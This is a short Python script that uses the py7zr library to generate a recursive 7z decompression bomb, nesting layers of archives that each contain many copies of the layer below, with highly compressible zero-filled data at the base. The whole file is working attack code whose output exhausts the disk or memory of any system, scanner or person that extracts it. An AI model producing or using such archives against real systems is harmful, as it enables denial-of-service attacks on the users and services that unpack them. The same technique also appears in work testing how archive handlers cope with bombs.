import io
import py7zr

def write_base_dummy(size_MB):
    """Writes an in-memory dummy file of specified size as a 7z archive."""
    mem_buff = io.BytesIO()

    dummy_data = b"0" * size_MB * 1024 * 1024

    with py7zr.SevenZipFile(mem_buff, "w") as af:
        af.writestr(dummy_data, "dummy.txt")

    compressed_dummy = mem_buff.getvalue()
    mem_buff.close()

    return compressed_dummy


def write_layer(compressed_file, file_count):
    """Writes one layer containing multiple copies of a 7z archive."""
    mem_buff = io.BytesIO()

    with py7zr.SevenZipFile(mem_buff, "w") as af:
        for i in range(file_count):
            af.writestr(compressed_file, f"layer{i}.7z")

    compressed_layer = mem_buff.getvalue()
    mem_buff.close()

    return compressed_layer

def make_recurssive_bomb(dummy_size,file_count,layer_count):
    """Main function for creating recursive 7zbomb"""
    layer = write_base_dummy(dummy_size)

    for i in range(layer_count):
        layer = write_layer(layer,file_count)
        
    return layer